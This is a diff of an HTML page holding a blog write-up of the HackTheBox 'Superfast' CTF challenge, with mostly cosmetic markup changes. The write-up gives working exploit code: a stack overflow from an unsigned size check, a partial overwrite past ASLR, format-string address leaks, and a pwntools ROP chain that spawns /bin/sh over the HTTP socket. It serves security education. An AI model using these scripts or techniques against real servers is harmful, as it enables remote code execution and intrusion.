@@ -8,10 +8,10 @@
     <meta name="HandheldFriendly" content="True" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
-    <link rel="preload" as="style" href="/assets/built/screen.css?v=c45f525af4" />
-    <link rel="preload" as="script" href="/assets/built/casper.js?v=c45f525af4" />
+    <link rel="preload" as="style" href="/assets/built/screen.css?v=484755abd6" />
+    <link rel="preload" as="script" href="/assets/built/casper.js?v=484755abd6" />
 
-    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=c45f525af4" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=484755abd6" />
 
     <link rel="icon" href="https://pwning.tech/content/images/size/w256h256/format/png/2024/02/favicon.webp" type="image/png">
     <link rel="canonical" href="https://pwning.tech/superfast/">
@@ -24,7 +24,7 @@
     <meta property="og:url" content="https://pwning.tech/superfast/">
     <meta property="og:image" content="https://pwning.tech/content/images/2024/02/logo_twitter_card-1.webp">
     <meta property="article:published_time" content="2022-11-28T13:21:02.000Z">
-    <meta property="article:modified_time" content="2023-02-22T05:51:08.000Z">
+    <meta property="article:modified_time" content="2024-03-24T22:07:07.000Z">
     <meta property="article:tag" content="Binary Exploitation">
     <meta property="article:tag" content="HackTheBox challenges">
     <meta property="article:tag" content="ROP chains">
@@ -67,7 +67,7 @@
     "headline": "Superfast (HackTheBox)",
     "url": "https://pwning.tech/superfast/",
     "datePublished": "2022-11-28T13:21:02.000Z",
-    "dateModified": "2023-02-22T05:51:08.000Z",
+    "dateModified": "2024-03-24T22:07:07.000Z",
     "keywords": "Binary Exploitation, HackTheBox challenges, ROP chains, x64 Assembly, BusinessCTF2022, ASLR",
     "description": "Hey folks. In this write-up, we&#x27;re going to discuss the Superfast challenge in HackTheBox which was part of the HackTheBox Business CTF 2022. We&#x27;re going to perform a single-byte overwrite to bypass ASLR, leak stack pointers, and perform a Return Oriented Programming (ROP) chain. The description of the challenge is:\n\nWe&#x27;ve tracked connections made from an infected workstation back to this server. We believe it is running a C2 checkin interface, the source code of which we aquired from a temporar",
     "mainEntityOfPage": "https://pwning.tech/superfast/"
@@ -80,8 +80,8 @@
     <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="edf92d97a2ffbb07659fa25625" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://pwning.tech/" crossorigin="anonymous"></script>
     
     <link href="https://pwning.tech/webmentions/receive/" rel="webmention">
-    <script defer src="/public/cards.min.js?v=c45f525af4"></script>
-    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=c45f525af4">
+    <script defer src="/public/cards.min.js?v=484755abd6"></script>
+    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=484755abd6">
     <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/toolbar/prism-toolbar.min.css" integrity="sha512-Dqf5696xtofgH089BgZJo2lSWTvev4GFo+gA2o4GullFY65rzQVQLQVlzLvYwTo0Bb2Gpb6IqwxYWtoMonfdhQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
 <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/prism-themes/1.9.0/prism-vsc-dark-plus.min.css" integrity="sha512-ML8rkwYTFNcblPFx+VLgFIT2boa6f8DDP6p6go4+FT0/mJ8DCbCgi6S0UdjtzB3hKCr1zhU+YVB0AHhIloZP8Q==" crossorigin="anonymous" referrerpolicy="no-referrer" />
 <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/brands.min.css" integrity="sha512-W/zrbCncQnky/EzL+/AYwTtosvrM+YG/V6piQLSe2HuKS6cmbw89kjYkp3tWFn1dkWV7L1ruvJyKbLz73Vlgfg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
@@ -227,7 +227,7 @@
 
 
 <main id="site-main" class="site-main">
-<article class="article post tag-binexp tag-htb-challenges tag-rop-chains tag-x64-assembly tag-businessctf2022 tag-aslr tag-hash-import-2023-02-18-16-45 tag-hash-import-2023-09-17-13-10 tag-hash-import-2023-12-29-22-15 featured no-image ">
+<article class="article post tag-binexp tag-htb-challenges tag-rop-chains tag-x64-assembly tag-businessctf2022 tag-aslr tag-hash-import-2023-02-18-16-45 tag-hash-import-2023-09-17-13-10 tag-hash-import-2023-12-29-22-15 no-image ">
 
     <header class="article-header gh-canvas">
 
@@ -235,9 +235,6 @@
                 <span class="post-card-primary-tag">
                     <a href="/tag/binexp/">Binary Exploitation</a>
                 </span>
-                <span class="post-card-featured"><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
-    <path d="M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.68127L6.99365 6.25002L4.49365 4.58752Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-</svg> Featured</span>
         </div>
 
         <h1 class="article-title">Superfast (HackTheBox)</h1>
@@ -271,9 +268,9 @@
         <p>Hey folks. In this write-up, we're going to discuss the Superfast challenge in HackTheBox which was part of the HackTheBox Business CTF 2022. We're going to perform a <strong>single-byte overwrite</strong> to <strong>bypass ASLR</strong>, <strong>leak stack pointers</strong>, and perform a <strong>Return Oriented Programming </strong>(ROP) chain. The description of the challenge is:</p><blockquote>We've tracked connections made from an infected workstation back to this server. We believe it is running a C2 checkin interface, the source code of which we aquired from a temporarily exposed Git repository several months ago.Apparently the engineers behind it are obsessed with speed, extending their programs with low-level code. We think in their search for speed they might have cut some corners - can you find a way in?</blockquote><p>I really enjoyed pwning this challenge since it has a unique and quite realistic target which I haven't seen before in CTFs.</p><h1 id="index">Index</h1><ul><li>First looks</li><li>Finding primitives</li><li>Developing the ROP chain</li><li>Retrieving the flag</li></ul><h1 id="first-looks">First looks</h1><p>We're given a PHP file with a shared object (.so) written in C, and we're given a source directory for the shared object.</p><figure class="kg-card kg-code-card"><pre><code>.
 ├── build_docker.sh
 ├── challenge
-│   ├── index.php
-│   ├── php_logger.so
-│   └── start.sh
+│&nbsp;&nbsp; ├── index.php
+│&nbsp;&nbsp; ├── php_logger.so
+│&nbsp;&nbsp; └── start.sh
 ├── Dockerfile
 └── src
     ├── build.sh
@@ -282,8 +279,8 @@
     └── php_logger.h
 
 2 directories, 9 files
-</code></pre><figcaption>Directories given with the challenge</figcaption></figure><p>In <code>/challenge/start.sh</code> we can see that the challenge code gets bootstrapped using:</p><figure class="kg-card kg-code-card"><pre><code class="language-sh">#!/bin/sh
-while true; do php -dextension=/php_logger.so -S 0.0.0.0:1337; done</code></pre><figcaption>The content of start.sh</figcaption></figure><p>We can see that PHP loads <code>php_logger.so</code> as a binary extension for the webserver.</p><h1 id="finding-primitives">Finding primitives</h1><p>To start, a vulnerability primitive is a building block of an exploit. A primitive can be bundled with other primitives to achieve a higher impact, like teamwork.</p><h3 id="analysing-indexphp">Analysing index.php</h3><p>The content of index.php (below) checks for a header called <code>Cmd-Key</code> and a parameter <code>cmd</code>. </p><figure class="kg-card kg-code-card"><pre><code class="language-php">&lt;?php
+</code></pre><figcaption><p><span style="white-space: pre-wrap;">Directories given with the challenge</span></p></figcaption></figure><p>In <code>/challenge/start.sh</code> we can see that the challenge code gets bootstrapped using:</p><figure class="kg-card kg-code-card"><pre><code class="language-sh">#!/bin/sh
+while true; do php -dextension=/php_logger.so -S 0.0.0.0:1337; done</code></pre><figcaption><p><span style="white-space: pre-wrap;">The content of start.sh</span></p></figcaption></figure><p>We can see that PHP loads <code>php_logger.so</code> as a binary extension for the webserver.</p><h1 id="finding-primitives">Finding primitives</h1><p>To start, a vulnerability primitive is a building block of an exploit. A primitive can be bundled with other primitives to achieve a higher impact, like teamwork.</p><h3 id="analysing-indexphp">Analysing index.php</h3><p>The content of index.php (below) checks for a header called <code>Cmd-Key</code> and a parameter <code>cmd</code>. </p><figure class="kg-card kg-code-card"><pre><code class="language-php">&lt;?php
 if (isset($_SERVER['HTTP_CMD_KEY']) &amp;&amp; isset($_GET['cmd'])) {
 	$key = intval($_SERVER['HTTP_CMD_KEY']);
 	if ($key &lt;= 0 || $key &gt; 255) {
@@ -294,10 +291,10 @@ if (isset($_SERVER['HTTP_CMD_KEY']) &amp;&amp; isset($_GET['cmd'])) {
 } else {
 	http_response_code(400);
 }
-</code></pre><figcaption>Content of index.php</figcaption></figure><p>One of the most important stages of exploit development is making a reproducing environment. Considering I want to run GDB on <code>php_logger.so</code>, I will run the challenge without Docker. I can run the PHP <code>index.php</code> with <code>php -dextension=./php_logger.so -S 0.0.0.0:1337</code> in <code>/challenge/</code> and I can send the HTTP request using <code>curl '<a href="http://127.0.0.1:1337?cmd=123">http://127.0.0.1:1337/index.php?cmd=123</a>' -H 'Cmd-Key: 123</code>. We can see it succeeds because it returns a 200 status code. </p><figure class="kg-card kg-code-card"><pre><code>[Sat Nov 26 20:04:55 2022] 127.0.0.1:43846 Accepted
+</code></pre><figcaption><p><span style="white-space: pre-wrap;">Content of index.php</span></p></figcaption></figure><p>One of the most important stages of exploit development is making a reproducing environment. Considering I want to run GDB on <code>php_logger.so</code>, I will run the challenge without Docker. I can run the PHP <code>index.php</code> with <code>php -dextension=./php_logger.so -S 0.0.0.0:1337</code> in <code>/challenge/</code> and I can send the HTTP request using <code>curl '</code><a href="http://127.0.0.1:1337?cmd=123"><code>http://127.0.0.1:1337/index.php?cmd=123</code></a><code>' -H 'Cmd-Key: 123</code>. We can see it succeeds because it returns a 200 status code. </p><figure class="kg-card kg-code-card"><pre><code>[Sat Nov 26 20:04:55 2022] 127.0.0.1:43846 Accepted
 [Sat Nov 26 20:04:55 2022] 127.0.0.1:43846 [200]: GET /?cmd=123
 [Sat Nov 26 20:04:55 2022] 127.0.0.1:43846 Closing
-</code></pre><figcaption>Verbose output of the PHP webserver</figcaption></figure><p>Regarding functionality, we can see that <code>index.php</code> calls <code>log_cmd($cmd, $key)</code> with <code>0 &lt; $key &lt; 256</code>. </p><h3 id="analyzing-phploggerso">Analyzing php_logger.so</h3><p>We can find the source code of <code>php_logger.so</code> in <code>/src/php_logger.c</code>. Under which, we can find the source code of <code>log_cmd()</code> as well. We can see that log_cmd() retrieves function arguments using <code>zend_parse_parameters()</code>. Then, it calls <code>decrypt($cmd, $cmdlen, $key)</code> and - if the return is valid - appends to the <code>/tmp/log</code> file.  </p><figure class="kg-card kg-code-card"><pre><code class="language-c">PHP_FUNCTION(log_cmd) {
+</code></pre><figcaption><p><span style="white-space: pre-wrap;">Verbose output of the PHP webserver</span></p></figcaption></figure><p>Regarding functionality, we can see that <code>index.php</code> calls <code>log_cmd($cmd, $key)</code> with <code>0 &lt; $key &lt; 256</code>. </p><h3 id="analyzing-phploggerso">Analyzing php_logger.so</h3><p>We can find the source code of <code>php_logger.so</code> in <code>/src/php_logger.c</code>. Under which, we can find the source code of <code>log_cmd()</code> as well. We can see that log_cmd() retrieves function arguments using <code>zend_parse_parameters()</code>. Then, it calls <code>decrypt($cmd, $cmdlen, $key)</code> and - if the return is valid - appends to the <code>/tmp/log</code> file.  </p><figure class="kg-card kg-code-card"><pre><code class="language-c">PHP_FUNCTION(log_cmd) {
     char* input;
     zend_string* res;
     size_t size;
@@ -315,7 +312,7 @@ if (isset($_SERVER['HTTP_CMD_KEY']) &amp;&amp; isset($_GET['cmd'])) {
     }
     RETURN_NULL();
 }
-</code></pre><figcaption>Source code of <code>log_cmd()</code></figcaption></figure><p>This function does look safe, so the vulnerability is in <code>decrypt(input, size, key)</code>. This function checks if the size of the command is less than the size of the stack buffer. If it is more it will return, but if it is less it will memcpy() and XOR the buffer with the key. </p><figure class="kg-card kg-code-card"><pre><code class="language-c">zend_string* decrypt(char* buf, size_t size, uint8_t key) {
+</code></pre><figcaption><p><span style="white-space: pre-wrap;">Source code of </span><code spellcheck="false" style="white-space: pre-wrap;"><span>log_cmd()</span></code></p></figcaption></figure><p>This function does look safe, so the vulnerability is in <code>decrypt(input, size, key)</code>. This function checks if the size of the command is less than the size of the stack buffer. If it is more it will return, but if it is less it will memcpy() and XOR the buffer with the key. </p><figure class="kg-card kg-code-card"><pre><code class="language-c">zend_string* decrypt(char* buf, size_t size, uint8_t key) {
     char buffer[64] = {0};
     if (sizeof(buffer) - size &gt; 0) {
         memcpy(buffer, buf, size);
@@ -327,14 +324,14 @@ if (isset($_SERVER['HTTP_CMD_KEY']) &amp;&amp; isset($_GET['cmd'])) {
     }
     return zend_string_init(buffer, strlen(buffer), 0);
 }
-</code></pre><figcaption>Source code of <code>decrypt()</code></figcaption></figure><p>We can see that <code>sizeof(buffer) - size &gt; 0</code> is used for the size check. However, <code>sizeof()</code> returns <code>size_t</code>, which is an <strong>unsigned </strong>integer on 32-bit and (in this case) an <strong>unsigned</strong> long on 64-bit. Since we are essentially doing <code>ulong - int &gt; int</code>, we are using an unsigned value as a base value which means the value will wrap around. For example, in this case <code>(uint)0 - (int)1</code> would become <code>2**32-1</code>, instead of <code>-1</code>. A practical example would be the one below. The output of the program is  <code>4294967295 1</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">int main()
+</code></pre><figcaption><p><span style="white-space: pre-wrap;">Source code of </span><code spellcheck="false" style="white-space: pre-wrap;"><span>decrypt()</span></code></p></figcaption></figure><p>We can see that <code>sizeof(buffer) - size &gt; 0</code> is used for the size check. However, <code>sizeof()</code> returns <code>size_t</code>, which is an <strong>unsigned </strong>integer on 32-bit and (in this case) an <strong>unsigned</strong> long on 64-bit. Since we are essentially doing <code>ulong - int &gt; int</code>, we are using an unsigned value as a base value which means the value will wrap around. For example, in this case <code>(uint)0 - (int)1</code> would become <code>2**32-1</code>, instead of <code>-1</code>. A practical example would be the one below. The output of the program is  <code>4294967295 1</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">int main()
 {
     unsigned int a = 5;
     int b = 6;
 
     printf("%u %d", a - b, a - b &gt; 0);
 }
-</code></pre><figcaption>Demo of interaction between (unsigned) integers</figcaption></figure><p>That means that <code>sizeof(buffer) - size &gt; 0)</code> is always true, unless <code>sizeof(buffer) == size</code>. The result of that is a buffer overflow on the stack which we can leverage for a <strong>control flow hijacking primitive</strong>. Using Ghidra - the reverse engineering suite developed by the NSA - we can see that the offset from the buffer to the return address on the stack is 0x98 (152) bytes.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2022/11/image-6.png" class="kg-image" alt loading="lazy" width="722" height="664" srcset="https://pwning.tech/content/images/size/w600/2022/11/image-6.png 600w, https://pwning.tech/content/images/2022/11/image-6.png 722w" sizes="(min-width: 720px) 720px"><figcaption>Stack variable offsets in Ghidra</figcaption></figure><p>However, ASLR is enabled. That means that we cannot guess the library's memory address and hence cannot guess a return address for control flow hijacking. However, the smallest 12 bits of an address are <strong>not random</strong>,<strong> </strong>and thus can we reliably overwrite 12 bits of the return address. Say our normal return address would be <code>0x555555559a1e</code>, in the next program, it could be <code>0x55555123fa1e</code>, but the <code>0xa1e</code> at the end doesn't change, because it's the smallest 12 bits. </p><p>The reason only the first 12 bits of the address don't change, is because they point to 4096 bytes (2 ** 12 bits), which is the page size. The kernel - the manager of ASLR - can't work with addresses smaller than 4096 bytes.   </p><p>Sadly, we can only write bundles of 8 bits (1 byte) at a time considering we're working with a <code>char</code> data type. This means we could only overwrite the <code>0x1e</code> part of the addresses listed above, which narrows our possible return address area. </p><p>In Ghidra, we can figure out that the return address from <code>decrypt()</code> to <code>log_cmd()</code> (without ASLR) is equal <code>0x1014129</code>. This means our scope of possible return addresses ranges from <code>0x1014100</code> to <code>0x10141ff</code>. </p><pre><code class="language-nasm">      0010141e 48 89 ce     MOV       param_2,RCX
+</code></pre><figcaption><p><span style="white-space: pre-wrap;">Demo of interaction between (unsigned) integers</span></p></figcaption></figure><p>That means that <code>sizeof(buffer) - size &gt; 0)</code> is always true, unless <code>sizeof(buffer) == size</code>. The result of that is a buffer overflow on the stack which we can leverage for a <strong>control flow hijacking primitive</strong>. Using Ghidra - the reverse engineering suite developed by the NSA - we can see that the offset from the buffer to the return address on the stack is 0x98 (152) bytes.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2022/11/image-6.png" class="kg-image" alt="" loading="lazy" width="722" height="664" srcset="https://pwning.tech/content/images/size/w600/2022/11/image-6.png 600w, https://pwning.tech/content/images/2022/11/image-6.png 722w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">Stack variable offsets in Ghidra</span></figcaption></figure><p>However, ASLR is enabled. That means that we cannot guess the library's memory address and hence cannot guess a return address for control flow hijacking. However, the smallest 12 bits of an address are <strong>not random</strong>,<strong> </strong>and thus can we reliably overwrite 12 bits of the return address. Say our normal return address would be <code>0x555555559a1e</code>, in the next program, it could be <code>0x55555123fa1e</code>, but the <code>0xa1e</code> at the end doesn't change, because it's the smallest 12 bits. </p><p>The reason only the first 12 bits of the address don't change, is because they point to 4096 bytes (2 ** 12 bits), which is the page size. The kernel - the manager of ASLR - can't work with addresses smaller than 4096 bytes.   </p><p>Sadly, we can only write bundles of 8 bits (1 byte) at a time considering we're working with a <code>char</code> data type. This means we could only overwrite the <code>0x1e</code> part of the addresses listed above, which narrows our possible return address area. </p><p>In Ghidra, we can figure out that the return address from <code>decrypt()</code> to <code>log_cmd()</code> (without ASLR) is equal <code>0x1014129</code>. This means our scope of possible return addresses ranges from <code>0x1014100</code> to <code>0x10141ff</code>. </p><pre><code class="language-nasm">      0010141e 48 89 ce     MOV       param_2,RCX
       00101421 48 89 c7     MOV       param_1,RAX
       00101424 e8 07 fc     CALL      decrypt
                ff ff
@@ -342,7 +339,7 @@ if (isset($_SERVER['HTTP_CMD_KEY']) &amp;&amp; isset($_GET['cmd'])) {
                24 38
       0010142e 48 83 7c     CMP       qword ptr [RSP + local_10],0x0
                24 38 00
-</code></pre><p>The code in our return scope is the following. We can see that <code>decrypt()</code> is called, <code>print_message()</code> is called and a bunch of file IO functions. Internally, <code>print_message()</code> is a wrapper for <code>php_printf()</code>: the <a href="https://www.php.net/manual/en/function.printf.php">printf()</a> function in PHP. This is interesting because it outputs to the HTTP response body, which means that we can <strong>leak pointers</strong>.  </p><figure class="kg-card kg-code-card"><pre><code class="language-c">    *(undefined4 *)(param_2 + 8) = 1;
+</code></pre><p>The code in our return scope is the following. We can see that <code>decrypt()</code> is called, <code>print_message()</code> is called and a bunch of file IO functions. Internally, <code>print_message()</code> is a wrapper for <code>php_printf()</code>: the <a href="https://www.php.net/manual/en/function.printf.php">printf()</a> function in PHP. This is interesting because it outputs to the HTTP response body, which means that we can <strong>leak pointers</strong>.  </p><figure class="kg-card kg-code-card"><pre><code class="language-c">    *(undefined4 *)(param_2 + 8) = 1;
   }
   else {
     iVar1 = decrypt(local_20,local_28,(size_t *)(local_30 &amp; 0xff),local_28,(size_t)inlen);
@@ -358,7 +355,7 @@ if (isset($_SERVER['HTTP_CMD_KEY']) &amp;&amp; isset($_GET['cmd'])) {
     *(undefined4 *)(param_2 + 8) = 1;
   }
   return;
-}</code></pre><figcaption>C decompilation of our return scope&nbsp;</figcaption></figure><p>However, in order to leak pointers with <code>print_message()</code>, we need to set the RDI register to the printf format string. Fortunately, the RDI register is set to the <code>input</code> argument of <code>decrypt(char* buf, size_t size, uint8_t key)</code> at <code>0x101390</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">      00101385 48 8b 84     MOV       RAX,qword ptr [RSP + local_18]
+}</code></pre><figcaption><p><span style="white-space: pre-wrap;">C decompilation of our return scope&nbsp;</span></p></figcaption></figure><p>However, in order to leak pointers with <code>print_message()</code>, we need to set the RDI register to the printf format string. Fortunately, the RDI register is set to the <code>input</code> argument of <code>decrypt(char* buf, size_t size, uint8_t key)</code> at <code>0x101390</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">      00101385 48 8b 84     MOV       RAX,qword ptr [RSP + local_18]
                24 a0 00 
                00 00
       0010138d 48 89 c6     MOV       inputlen,RAX
@@ -367,7 +364,7 @@ if (isset($_SERVER['HTTP_CMD_KEY']) &amp;&amp; isset($_GET['cmd'])) {
                ff ff
       00101398 48 8b 54     MOV       key,qword ptr [RSP + local_58]
                24 60
-</code></pre><figcaption>Assembly code which moves the input into the RDI register</figcaption></figure><p>When I try to fuzz using a script, I receive the following output: </p><figure class="kg-card kg-code-card"><pre><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@\x81\xd5\x84U\x80~</code></pre><figcaption>Fuzzing output</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-py">from pwn import xor
+</code></pre><figcaption><p><span style="white-space: pre-wrap;">Assembly code which moves the input into the RDI register</span></p></figcaption></figure><p>When I try to fuzz using a script, I receive the following output: </p><figure class="kg-card kg-code-card"><pre><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@\x81\xd5\x84U\x80~</code></pre><figcaption><p><span style="white-space: pre-wrap;">Fuzzing output</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-py">from pwn import xor
 import requests
 
 xorkey = 1
@@ -378,7 +375,7 @@ headers = {"cmd-key": str(xorkey)}
 # offset = 152 
 payload = b"A"*152 + b"\x40"
 content = s.get(b"http://127.0.0.1:1337?cmd="+payload, headers=headers).content
-print(xor(content, xorkey))</code></pre><figcaption>Script used to fuzz</figcaption></figure><p>However, when we remove the <code>xor()</code> function call, we can see that the end of the response is an address like <code>b'A\x80\xd4\x85T\x81\x7f'</code>. Using <code>print(hex(u64(content[63:].ljust(8, b'\x00'))))</code> we can translate it to <code>0x7f815485d48041</code>. In order to identify where this leak happens, we can start a GDB server. We leak the address <code>0x7f651305f54041</code> and in GDB we can see with <code>vmmap</code> (in <a href="https://github.com/pwndbg/pwndbg">pwndbg</a>) that this falls under <code>0x7f6513000000     0x7f6513200000 rw-p   200000      0 [anon_7f6513000]</code>. Since this isn't executable it's irrelevant for the ROP chain. </p><figure class="kg-card kg-code-card"><pre><code class="language-py">from pwn import xor, gdb, u64
+print(xor(content, xorkey))</code></pre><figcaption><p><span style="white-space: pre-wrap;">Script used to fuzz</span></p></figcaption></figure><p>However, when we remove the <code>xor()</code> function call, we can see that the end of the response is an address like <code>b'A\x80\xd4\x85T\x81\x7f'</code>. Using <code>print(hex(u64(content[63:].ljust(8, b'\x00'))))</code> we can translate it to <code>0x7f815485d48041</code>. In order to identify where this leak happens, we can start a GDB server. We leak the address <code>0x7f651305f54041</code> and in GDB we can see with <code>vmmap</code> (in <a href="https://github.com/pwndbg/pwndbg">pwndbg</a>) that this falls under <code>0x7f6513000000     0x7f6513200000 rw-p   200000      0 [anon_7f6513000]</code>. Since this isn't executable it's irrelevant for the ROP chain. </p><figure class="kg-card kg-code-card"><pre><code class="language-py">from pwn import xor, gdb, u64
 import requests
 import time
 
@@ -395,9 +392,9 @@ content = s.get(b"http://127.0.0.1:1337?cmd="+payload, headers=headers).content
 print(hex(u64(content[63:].ljust(8, b'\x00'))))
 
 time.sleep(999)
-</code></pre><figcaption>Script for debugging using GDB</figcaption></figure><p>Since that is useless, we need to find another way to leak addresses. To do that, we can utilize the fact that we're calling <code>printf()</code>. By supplying a payload like <code>%08x %08x %08x %08x</code> we can leak the stack. By trial and error, I found out that we can leak the stack, php_logger.so and the PHP binary using the format string <code>%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_</code>. Using the following payload, we can see the following leaks:</p><figure class="kg-card kg-code-card"><pre><code>php @ 0x55c720a64000
+</code></pre><figcaption><p><span style="white-space: pre-wrap;">Script for debugging using GDB</span></p></figcaption></figure><p>Since that is useless, we need to find another way to leak addresses. To do that, we can utilize the fact that we're calling <code>printf()</code>. By supplying a payload like <code>%08x %08x %08x %08x</code> we can leak the stack. By trial and error, I found out that we can leak the stack, php_logger.so and the PHP binary using the format string <code>%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_</code>. Using the following payload, we can see the following leaks:</p><figure class="kg-card kg-code-card"><pre><code>php @ 0x55c720a64000
 php_logger.so @ 0x7f609866e000
-stack @ 0x7fff10fbd480</code></pre><figcaption>Output of the script</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-py">#!/usr/bin/env python3
+stack @ 0x7fff10fbd480</code></pre><figcaption><p><span style="white-space: pre-wrap;">Output of the script</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-py">#!/usr/bin/env python3
 
 from pwn import xor, u64, gdb
 import requests
@@ -428,7 +425,7 @@ print("php_logger.so @", hex(logger_base))
 print("stack @", hex(stack))
 
 time.sleep(999)
-</code></pre><figcaption>Payload for leaking addresses</figcaption></figure><p>We have the needed primitives, so we can develop the ROP chain.</p><h1 id="developing-the-rop-chain">Developing the ROP chain</h1><p>Now we can use pwntools' ELF classes in order to make automatic ROP-chains. Using pwntools' ELF class we can see that the <code>execl</code> function in the PLT section of the <code>php</code> binary. This means we can use it to spawn a shell. Our strategy is:</p><ol><li>Leaking the address of the PHP binary and the <code>php_logger.so</code> in memory.</li><li>dup2(4, N) to set stdin, stdout and stderr file descriptors to the TCP connection file descriptor for the webserver. </li><li> execl("/bin/sh", "/bin/sh", 0) to spawn the /bin/sh executable</li></ol><p>We can generate a ROP chain automatically with pwntools:</p><figure class="kg-card kg-code-card"><pre><code class="language-py">rop = ROP(php)
+</code></pre><figcaption><p><span style="white-space: pre-wrap;">Payload for leaking addresses</span></p></figcaption></figure><p>We have the needed primitives, so we can develop the ROP chain.</p><h1 id="developing-the-rop-chain">Developing the ROP chain</h1><p>Now we can use pwntools' ELF classes in order to make automatic ROP-chains. Using pwntools' ELF class we can see that the <code>execl</code> function in the PLT section of the <code>php</code> binary. This means we can use it to spawn a shell. Our strategy is:</p><ol><li>Leaking the address of the PHP binary and the <code>php_logger.so</code> in memory.</li><li>dup2(4, N) to set stdin, stdout and stderr file descriptors to the TCP connection file descriptor for the webserver. </li><li> execl("/bin/sh", "/bin/sh", 0) to spawn the /bin/sh executable</li></ol><p>We can generate a ROP chain automatically with pwntools:</p><figure class="kg-card kg-code-card"><pre><code class="language-py">rop = ROP(php)
 
 '''
 fd[0]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
@@ -446,7 +443,7 @@ rop.call('dup2', [4, 2])
 binsh = next(php.search(b"/bin/sh\x00"))
 
 rop.call('execl', [binsh, binsh, 0])
-print(rop.dump())</code></pre><figcaption>Python code for generating the ROP chain</figcaption></figure><p>Which gives the following ROP chain:</p><figure class="kg-card kg-code-card"><pre><code>0x0000:   0x56244b60816b pop rdi; ret
+print(rop.dump())</code></pre><figcaption><p><span style="white-space: pre-wrap;">Python code for generating the ROP chain</span></p></figcaption></figure><p>Which gives the following ROP chain:</p><figure class="kg-card kg-code-card"><pre><code>0x0000:   0x56244b60816b pop rdi; ret
 0x0008:              0x4 [arg0] rdi = 4
 0x0010:   0x56244b6043fc pop rsi; ret
 0x0018:              0x0 [arg1] rsi = 0
@@ -468,10 +465,10 @@ print(rop.dump())</code></pre><figcaption>Python code for generating the ROP cha
 0x0098:   0x56244b6043fc pop rsi; ret
 0x00a0:   0x56244bd03fc3 [arg1] rsi = 94713890750403
 0x00a8:   0x56244b6042d0 execl
-</code></pre><figcaption>ROP chain generated by pwntools</figcaption></figure><p>As we can see, it does the following:</p><figure class="kg-card kg-code-card"><pre><code>dup(4, 0)
+</code></pre><figcaption><p><span style="white-space: pre-wrap;">ROP chain generated by pwntools</span></p></figcaption></figure><p>As we can see, it does the following:</p><figure class="kg-card kg-code-card"><pre><code>dup(4, 0)
 dup(4, 1)
 dup(4, 2)
-execl("/bin/sh", "/bin/sh", 0)</code></pre><figcaption>C representation of the ROP chain</figcaption></figure><h1 id="retrieving-the-flag">Retrieving the flag</h1><p>I coded the following script to utilize the ROP chain. If we run this, we get a shell on the box. </p><figure class="kg-card kg-code-card"><pre><code class="language-py">#!/usr/bin/env python3
+execl("/bin/sh", "/bin/sh", 0)</code></pre><figcaption><p><span style="white-space: pre-wrap;">C representation of the ROP chain</span></p></figcaption></figure><h1 id="retrieving-the-flag">Retrieving the flag</h1><p>I coded the following script to utilize the ROP chain. If we run this, we get a shell on the box. </p><figure class="kg-card kg-code-card"><pre><code class="language-py">#!/usr/bin/env python3
 
 from pwn import xor, u64, gdb, ELF, p64, remote, ROP, context
 import requests
@@ -539,7 +536,7 @@ p = remote(target_ip, int(target_port))
 p.send(http.encode())
 p.interactive()
 
-time.sleep(999)</code></pre><figcaption>Python script for retrieving the flag</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ python3 script.py
+time.sleep(999)</code></pre><figcaption><p><span style="white-space: pre-wrap;">Python script for retrieving the flag</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ python3 script.py
 [*] sending payload...
 [*] loading addresses...
 [+] php @ 0x55da3ce00000
@@ -573,7 +570,7 @@ time.sleep(999)</code></pre><figcaption>Python script for retrieving the flag</f
 [*] Switching to interactive mode
 sh: turning off NDELAY mode
 $ whoami
